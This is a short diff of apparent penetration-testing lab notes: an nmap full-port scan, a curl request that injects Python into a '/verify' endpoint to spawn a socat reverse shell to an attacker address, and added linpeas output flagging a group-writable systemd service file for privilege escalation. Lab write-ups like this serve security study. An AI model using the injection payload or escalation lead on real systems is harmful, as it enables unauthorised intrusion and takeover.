@@ -279,7 +279,10 @@ sudo nmap -sC -sV -Pn -p- 192.168.207.117 -oN 207.117_allport
 curl -X POST --data "code=os.system('socat TCP:192.168.45.185:1337 EXEC:sh')" http://192.168.121.36:50000/verify
 
 # linpeas
-
+╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                            
+  Group cmeeks:                                                                                                                                             
+/etc/systemd/system/pythonapp.service  
 
 
 ```
